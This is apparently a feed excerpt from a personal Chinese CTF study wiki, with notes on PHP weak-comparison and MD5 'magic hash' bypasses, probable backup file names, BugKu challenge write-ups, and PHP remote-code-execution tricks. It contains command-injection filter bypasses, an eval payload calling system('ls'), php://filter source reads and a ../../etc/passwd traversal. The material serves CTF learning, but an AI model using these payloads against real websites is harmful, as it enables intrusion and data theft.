    <content type="html"><![CDATA[<h4 id="MD5-函数数组绕过"><a href="#MD5-函数数组绕过" class="headerlink" title="MD5()函数数组绕过"></a>MD5()函数数组绕过</h4><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">include_once “flag.php”;</span><br><span class="line">ini_set(“display_errors”, 0);</span><br><span class="line">$str &#x3D; strstr($_SERVER[‘REQUEST_URI’], ‘?’);&#x2F;&#x2F;返回$_SERVER[‘REQUEST_URI’]内从‘?’后开始的值。</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line">$str &#x3D; str_replace(‘key’,”,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">echo $flag.”取得flag”;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>绕过方法：</li></ol><ul><li> 对key关键词的过滤可以用kekeyy绕过，从而传递key1&amp;key2进行比较。</li><li> md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</li><li> 利用==比较漏洞,如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。下列的字符串的MD5值都是0e开头的：<br><code>QNKCDZO</code><br><code>240610708</code><br><code>s878926199a</code><br><code>s155964671a</code><br><code>s214587387a</code><br><code>s214587387a</code></li></ul><p><code>sha1(str)</code><br><code>sha1(&#39;aaroZmOk&#39;)</code><br><code>sha1(&#39;aaK1STfY&#39;)</code><br><code>sha1(&#39;aaO8zKZF&#39;)</code><br><code>sha1(&#39;aa3OFF9m&#39;)</code></p><p>ref: <a href="https://blog.csdn.net/zpy1998zpy/article/details/80582974">https://blog.csdn.net/zpy1998zpy/article/details/80582974</a></p><h4 id="MD5碰撞严格比较（非弱类型绕过）"><a href="#MD5碰撞严格比较（非弱类型绕过）" class="headerlink" title="MD5碰撞严格比较（非弱类型绕过）"></a>MD5碰撞严格比较（非弱类型绕过）</h4><p>构造前缀碰撞法”（chosen-prefix collisions）<br><a href="https://xz.aliyun.com/t/2232">https://xz.aliyun.com/t/2232</a></p><h4 id="SHA1绕过（-弱类型）"><a href="#SHA1绕过（-弱类型）" class="headerlink" title="SHA1绕过（==弱类型）"></a>SHA1绕过（==弱类型）</h4><p>和MD5弱类型一样，可以用数组绕过。</p><h4 id="SHA1强类型绕过"><a href="#SHA1强类型绕过" class="headerlink" title="SHA1强类型绕过"></a>SHA1强类型绕过</h4><p><code>sha1(str)</code><br><code>sha1(&#39;aaroZmOk&#39;)</code><br><code>sha1(&#39;aaK1STfY&#39;)</code><br><code>sha1(&#39;aaO8zKZF&#39;)</code><br><code>sha1(&#39;aa3OFF9m&#39;)</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;MD5-函数数组绕过&quot;&gt;&lt;a href=&quot;#MD5-函数数组绕过&quot; class=&quot;headerlink&quot; title=&quot;MD5()函数数组绕过&quot;&gt;&lt;/a&gt;MD5()函数数组绕过&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;figure class=&quot;highlight plain</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF back-up-logs</title>
    <link href="https://tsunamori.github.io/wiki/CTF_back-up-logs/"/>
    <id>https://tsunamori.github.io/wiki/CTF_back-up-logs/</id>
    <published>2021-04-25T02:09:20.000Z</published>
    <updated>2021-04-26T07:34:40.252Z</updated>
    
    <content type="html"><![CDATA[<h4 id="文件后缀"><a href="#文件后缀" class="headerlink" title="文件后缀"></a>文件后缀</h4><p>back.rar<br>back.tar<br>back.tar.gz<br>back.zip<br>backup.rar<br>backup.tar<br>backup.tar.gz<br>backup.zip<br>temp.rar<br>temp.tar<br>temp.tar.gz<br>temp.zip<br>web.rar<br>web.tar<br>web.tar.gz<br>web.zip<br>website.rar<br>website.tar<br>website.tar.gz<br>website.zip<br><a href="http://www.rar/">www.rar</a><br><a href="http://www.tar/">www.tar</a><br><a href="http://www.tar.gz/">www.tar.gz</a><br><a href="http://www.zip/">www.zip</a><br>wwwroot.rar<br>wwwroot.tar<br>wwwroot.tar.gz<br>wwwroot.zip<br>index.php.bak</p><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p><a href="https://www.freebuf.com/sectool/202350.html">https://www.freebuf.com/sectool/202350.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;文件后缀&quot;&gt;&lt;a href=&quot;#文件后缀&quot; class=&quot;headerlink&quot; title=&quot;文件后缀&quot;&gt;&lt;/a&gt;文件后缀&lt;/h4&gt;&lt;p&gt;back.rar&lt;br&gt;back.tar&lt;br&gt;back.tar.gz&lt;br&gt;back.zip&lt;br&gt;backup.rar&lt;</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Tools</title>
    <link href="https://tsunamori.github.io/wiki/CTF-Tools/"/>
    <id>https://tsunamori.github.io/wiki/CTF-Tools/</id>
    <published>2021-04-23T08:48:56.000Z</published>
    <updated>2021-05-11T07:21:31.381Z</updated>
    
    <content type="html"><![CDATA[<ol><li>在线正则表达式  <a href="https://regex101.com/">https://regex101.com/</a></li><li>CTF在线工具 <a href="http://ctf.ssleye.com/">http://ctf.ssleye.com/</a></li><li>js美化 <a href="https://beautifier.io/">https://beautifier.io/</a></li><li>在线代码运算：<a href="https://www.anycodes.cn/#/OnlineCode">https://www.anycodes.cn/#/OnlineCode</a></li></ol><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><ol><li>查看常用CTF文件是否存在于网站中：<a href="https://github.com/WangYihang/SourceLeakHacker">https://github.com/WangYihang/SourceLeakHacker</a></li><li>常规git泄漏：<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;在线正则表达式  &lt;a href=&quot;https://regex101.com/&quot;&gt;https://regex101.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;CTF在线工具 &lt;a href=&quot;http://ctf.ssleye.com/&quot;&gt;http://ctf.ssl</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    
    <category term="Tools" scheme="https://tsunamori.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>CTF PHP</title>
    <link href="https://tsunamori.github.io/wiki/CTF_PHP/"/>
    <id>https://tsunamori.github.io/wiki/CTF_PHP/</id>
    <published>2021-04-23T01:51:12.000Z</published>
    <updated>2021-04-26T05:58:19.984Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PHP-变形绕过"><a href="#PHP-变形绕过" class="headerlink" title="PHP 变形绕过"></a>PHP 变形绕过</h3><ol><li><code>==</code>比较双方都是数字或数字字符串（a string which can be interperted as int or float）<ul><li>var_dump(0 == “a”); // 0 == 0 -&gt; true</li><li>var_dump(“1” == “01”); // 1 == 1 -&gt; true</li><li>var_dump(“10” == “1e1”); // 10 == 10 -&gt; true</li><li>var_dump(100 == “1e2”); // 100 == 100 -&gt; true</li><li>0==’0’ //true</li><li>0 == ‘abcdefg’ //true</li><li>0 === ‘abcdefg’ //false</li><li>1 == ‘1abcdef’ //true</li></ul></li></ol><h3 id="PHP-Eval"><a href="#PHP-Eval" class="headerlink" title="PHP Eval"></a>PHP Eval</h3><ol><li>eval()内参数数目不限，彼此之间用分号隔开。</li></ol><h3 id="PHP-环境变量和系统变量"><a href="#PHP-环境变量和系统变量" class="headerlink" title="PHP 环境变量和系统变量"></a>PHP 环境变量和系统变量</h3><ol><li>常用环境变量和系统变量：<ul><li><a href="https://blog.csdn.net/liubing300/article/details/6883715">https://blog.csdn.net/liubing300/article/details/6883715</a></li><li>$GLOBALS:包含了全部变量的全局组合数组。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;PHP-变形绕过&quot;&gt;&lt;a href=&quot;#PHP-变形绕过&quot; class=&quot;headerlink&quot; title=&quot;PHP 变形绕过&quot;&gt;&lt;/a&gt;PHP 变形绕过&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;==&lt;/code&gt;比较双方都是数字或数字字符串（a string w</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>错题wp集</title>
    <link href="https://tsunamori.github.io/wiki/CTF_%E9%94%99%E9%A2%98%E9%9B%86/"/>
    <id>https://tsunamori.github.io/wiki/CTF_%E9%94%99%E9%A2%98%E9%9B%86/</id>
    <published>2021-04-22T06:57:37.000Z</published>
    <updated>2021-05-11T08:27:53.269Z</updated>
    
    <content type="html"><![CDATA[<ol><li>SUCTF 2019 EasySQL <a href="https://blog.csdn.net/qq_43619533/article/details/103434935">https://blog.csdn.net/qq_43619533/article/details/103434935</a><ul><li> 考点： 通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||</li></ul></li><li>BugKu web 21 <a href="https://blog.csdn.net/qq_41333578/article/details/92759619">https://blog.csdn.net/qq_41333578/article/details/92759619</a><ul><li> 考点： 弱比较的绕过; PHP伪协议php://input如何输入请求主体; eregi绕过的两种方式; 注意<code>\x00</code>会截断后续内容，而%00不会。</li></ul></li><li>BugKu 冬至红包 <a href="https://blog.csdn.net/qq_46230755/article/details/112973722">https://blog.csdn.net/qq_46230755/article/details/112973722</a><ul><li> 考点： 新姿势</li></ul></li><li>BugKu web18 <a href="https://ctf.bugku.com/challenges/detail/id/85.html">https://ctf.bugku.com/challenges/detail/id/85.html</a><ul><li>考点：爬虫复习、利用eval()直接计算string内的数字公式、利用同一个Session进行get和post请求，防止网页动态刷新计算值失效、post请求中data注意格式为{‘somevtext’：’somevalue’}、python和PHP的计算方式不太一样，可能存在计算偏差导致得不到flag，需要重复发送几次。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;114.67.246.176:14925&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line">r &#x3D; s.get(url)</span><br><span class="line"># 这里要根据网页的编码来设置解码，这个目标网站编码为&#39;utf-8&#39;</span><br><span class="line">r.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">soup&#x3D;BeautifulSoup(r.text,&#39;lxml&#39;)</span><br><span class="line">data&#x3D;soup.select(&#39;div&#39;)</span><br><span class="line">for item in data:</span><br><span class="line">    #获取原文为804134448*284526014-53361872*1933492032+466213037-393751154*4253881+1224286171-1203351395*1548147628+1689398514&#x3D;?;</span><br><span class="line">    result&#x3D;item.get_text()</span><br><span class="line"></span><br><span class="line">result1&#x3D;result[0:len(result)-3] #去掉后三位‘&#x3D;?;’</span><br><span class="line"></span><br><span class="line">result2 &#x3D; eval(result1) #计算数值</span><br><span class="line"></span><br><span class="line">result3&#x3D;&#123;&#39;value&#39;:result2&#125; #添加post请求数据格式</span><br><span class="line"></span><br><span class="line">mssg&#x3D;s.post(url, data&#x3D;result3) #利用同一个session，防止网页刷新。</span><br><span class="line"></span><br><span class="line">print(mssg.text)</span><br></pre></td></tr></table></figure></li></ul></li><li>BugKu Web 32<br>题目：文件上传;My name is margin,give me a image file not a php</li></ol><ul><li>解题思路：文件上传漏洞，掏出上传fuzz试试看。<br>fuzz没过，看评论说是把multipart/form-data;修改成Content-Type: mulTipart/form-data; ，然后修改php文件为php4，竟然还有这种操作，学到了。</li></ul><ol><li>BugKu Web 33<br>提示：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag:&#123;xxx&#125;</span><br><span class="line">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D;</span><br><span class="line"> &#x2F;&#x2F; &#125;l.&amp;W&#39;EG*B(W[(+G&#39;U-0</span><br></pre></td></tr></table></figure>题目：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">    $key &#x3D; md5(&#39;ISCC&#39;);</span><br><span class="line">    $x &#x3D; 0;</span><br><span class="line">    $len &#x3D; strlen($data);</span><br><span class="line">    $klen &#x3D; strlen($key);</span><br><span class="line">    for ($i&#x3D;0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; $key[$x];</span><br><span class="line">        $x+&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i&#x3D;0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .&#x3D; chr((ord($data[$i]) + ord($char[$i])) % 128);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ol><ul><li>解题思路：在线解base64的时候还没注意到，复制下来才发现还有特殊字符。<code>.=</code>连接赋值运算符，将右边参数附加到左边的参数之后。完整的看了一遍代码，发现应该是得到提示的base64字符串的算法。懒得配环境，对PHP一直是只会读代码不会写应用的状态，干脆在网上找了找PHP在线运行网站。试着运行了一下原算法用不同的数字和字母输入data内容。<br>根据提示中的base64推断，data长度为20。<br>逆推写了一下获取data的源码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&#39;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D;&#39;;</span><br><span class="line">$str_decode &#x3D; base64_decode($str);</span><br><span class="line">$len1&#x3D;strlen($str_decode);</span><br><span class="line"></span><br><span class="line">$key &#x3D; md5(&#39;ISCC&#39;);  # 729623334f0aa2784a1599fd374c120d</span><br><span class="line">$klen &#x3D; strlen($key);</span><br><span class="line">$char &#x3D; &#39;&#39;;</span><br><span class="line">$data &#x3D; &#39;&#39;;</span><br><span class="line">for ($i&#x3D;0; $i &lt; $len1; $i++) &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; $key[$x]; # 729623334f0aa2784a1599fd374c120d729623</span><br><span class="line">        $x+&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line"># print($len1); -&gt; 38</span><br><span class="line"># print($char); -&gt; 729623334f0aa2784a1599fd374c120d729623</span><br><span class="line">for ($i&#x3D;0; $i &lt; $len1; $i++) &#123;</span><br><span class="line">        $data .&#x3D; chr((ord($str_decode[$i])+128)-ord($char[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">print($data);    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>得到结果：lag{asdqwdfasfdawfefqwdqwdadwqadawd}，提示里写了Flag:{xxx}，所以把结果改成Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}，结果正确。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;SUCTF 2019 EasySQL &lt;a href=&quot;https://blog.csdn.net/qq_43619533/article/details/103434935&quot;&gt;https://blog.csdn.net/qq_43619533/article/</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript</title>
    <link href="https://tsunamori.github.io/wiki/JavaScript/"/>
    <id>https://tsunamori.github.io/wiki/JavaScript/</id>
    <published>2021-04-22T06:33:21.000Z</published>
    <updated>2021-04-26T07:51:19.353Z</updated>
    
    <content type="html"><![CDATA[<h3 id="JavaScript原型链污染攻击"><a href="#JavaScript原型链污染攻击" class="headerlink" title="JavaScript原型链污染攻击"></a>JavaScript原型链污染攻击</h3><p><a href="https://xz.aliyun.com/t/7182">https://xz.aliyun.com/t/7182</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;JavaScript原型链污染攻击&quot;&gt;&lt;a href=&quot;#JavaScript原型链污染攻击&quot; class=&quot;headerlink&quot; title=&quot;JavaScript原型链污染攻击&quot;&gt;&lt;/a&gt;JavaScript原型链污染攻击&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;h</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>HTTP request</title>
    <link href="https://tsunamori.github.io/wiki/HTTP-request/"/>
    <id>https://tsunamori.github.io/wiki/HTTP-request/</id>
    <published>2021-04-21T03:32:06.000Z</published>
    <updated>2021-04-23T02:37:50.396Z</updated>
    
    <content type="html"><![CDATA[<ol><li>同时提交get和post请求： 链接上提供get请求参数，请求末尾加入post请求参数，发送的请求仍为post请求。<ul><li><a href="https://blog.csdn.net/qq_32642035/article/details/104747362">https://blog.csdn.net/qq_32642035/article/details/104747362</a></li></ul></li><li> HTTP gzip: burp有自动解码gzip的功能。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;同时提交get和post请求： 链接上提供get请求参数，请求末尾加入post请求参数，发送的请求仍为post请求。&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/qq_32642035/article/details/10474</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>CTF PHP-RCE</title>
    <link href="https://tsunamori.github.io/wiki/CTF_PHP-RCE/"/>
    <id>https://tsunamori.github.io/wiki/CTF_PHP-RCE/</id>
    <published>2021-04-20T08:22:46.000Z</published>
    <updated>2021-05-10T02:33:37.759Z</updated>
    
    <content type="html"><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ol><li>文件包含命令执行 <a href="https://xz.aliyun.com/t/5535">https://xz.aliyun.com/t/5535</a><ul><li> <a href="https://blog.csdn.net/nai_kai/article/details/106805220">https://blog.csdn.net/nai_kai/article/details/106805220</a></li></ul></li><li> PHP伪协议（php://） <a href="https://www.jianshu.com/p/0a8339fcc269">https://www.jianshu.com/p/0a8339fcc269</a></li><li> 文件包含漏洞利用 <a href="https://blog.csdn.net/qq_32393893/article/details/110228864">https://blog.csdn.net/qq_32393893/article/details/110228864</a></li><li>远程文件包含漏洞（Remote File Inclusion RFI）:<ul><li> PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(Remote File Inclusion RFI)”。</li><li> allow_url_fopen = On 是否允许打开远程文件; allow_url_include = On 是否允许include/require远程文件</li><li> 远程文件包含webshell <a href="https://www.jianshu.com/p/be68cf9be911">https://www.jianshu.com/p/be68cf9be911</a></li></ul></li><li>RCE find the file by name in linux<ul><li> <a href="https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/">https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/</a></li><li> <a href="https://www.linux.com/topic/desktop/how-search-files-linux-command-line/">https://www.linux.com/topic/desktop/how-search-files-linux-command-line/</a></li></ul></li><li>在不能直接获取文件时，使用php://filter/read=convert.base64-encode/resource=test.php绕过获取文件内容<ul><li>如读取文件限制为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">   if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;; &#x2F;&#x2F;不能直接读取绝对路径</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"> include($file); &#x2F;&#x2F;include不能包含自身，会死循环，故拒绝访问。</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><ol><li> <a href="https://blog.csdn.net/u014549283/article/details/81783164">https://blog.csdn.net/u014549283/article/details/81783164</a></li><li> <a href="https://zhuanlan.zhihu.com/p/127047303">https://zhuanlan.zhihu.com/p/127047303</a></li><li> <a href="https://www.codenong.com/cs110213257/">https://www.codenong.com/cs110213257/</a></li><li> <a href="https://www.anquanke.com/post/id/208398">https://www.anquanke.com/post/id/208398</a></li><li> ${HOME:0:1} = / (获取目录分割符绕过过滤)</li><li> <a href="https://www.cnblogs.com/Tkitn/p/11661017.html">https://www.cnblogs.com/Tkitn/p/11661017.html</a></li><li> <a href="https://blog.csdn.net/qq_45927819/article/details/109671655">https://blog.csdn.net/qq_45927819/article/details/109671655</a></li><li> 管道符（; | || &amp; &amp;&amp;）过滤绕过：换行符%0a</li><li> 空格绕过：%20(目前做题最好使的一个绕过，&lt;&gt;经常不成功)</li><li> 关键词绕过：引号需要每个字母之间添加引号’或”，加<code>\</code>的话只需要加一个,cat可以用tac代替。</li><li> 文件读取不能用cat的替代：show_source(‘flag.php’)</li><li>Eval命令绕过利用，eval()内参数数目不限，彼此之间用分号隔开。<ul><li> eval( “var_dump($a);”); -&gt; eval( “var_dump(1),system(‘ls’);”);</li></ul></li><li> Assert()命令执行漏洞：</li><li> var_dump(<code>vi flag.php</code>)</li><li> 不允许输入标点符号，只允许数字和大小写，读取文件：$$args -&gt; $args = GLOBALS</li></ol><h3 id="Webshell-RCE-绕过"><a href="#Webshell-RCE-绕过" class="headerlink" title="Webshell RCE 绕过"></a>Webshell RCE 绕过</h3><ol><li><a href="https://xz.aliyun.com/t/8354">https://xz.aliyun.com/t/8354</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></li><li>不包含字母和数字： <a href="https://cloud.tencent.com/developer/article/1186230">https://cloud.tencent.com/developer/article/1186230</a></li></ol><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><ol><li>../../etc/passwd<ul><li><a href="https://www.freebuf.com/vuls/247620.html">https://www.freebuf.com/vuls/247620.html</a></li></ul></li></ol><h3 id="file-get-contents-绕过"><a href="#file-get-contents-绕过" class="headerlink" title="file_get_contents()绕过"></a>file_get_contents()绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">此函数可以获取本地的内容，也可以支持HTTP、FTP等协议远程抓取内容。</span><br><span class="line"></span><br><span class="line">当使用该函数打开某个文件时</span><br><span class="line">$result&#x3D;file_get_contents($_GET[&#39;xxx&#39;])</span><br><span class="line"></span><br><span class="line">可以通过在url里使用 ?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)</span><br><span class="line">这时$result的值为url编码的内容</span><br><span class="line"></span><br><span class="line">或者也可以在url里使用?xxx&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">然后将要赋值的数据写入POST里也可达到上述结果</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;文件包含命令执行 &lt;a href=&quot;https://xz.aliyun.com/t/5535&quot;&gt;https://</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>useful books</title>
    <link href="https://tsunamori.github.io/wiki/useful-books/"/>
    <id>https://tsunamori.github.io/wiki/useful-books/</id>
    <published>2021-04-15T01:56:37.000Z</published>
    <updated>2021-04-25T03:03:34.990Z</updated>
    
    <content type="html"><![CDATA[<ol><li>Hack tricks <a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></li><li>CTF-wiki <a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></li><li><a href="https://3wapp.github.io/WebSecurity">https://3wapp.github.io/WebSecurity</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
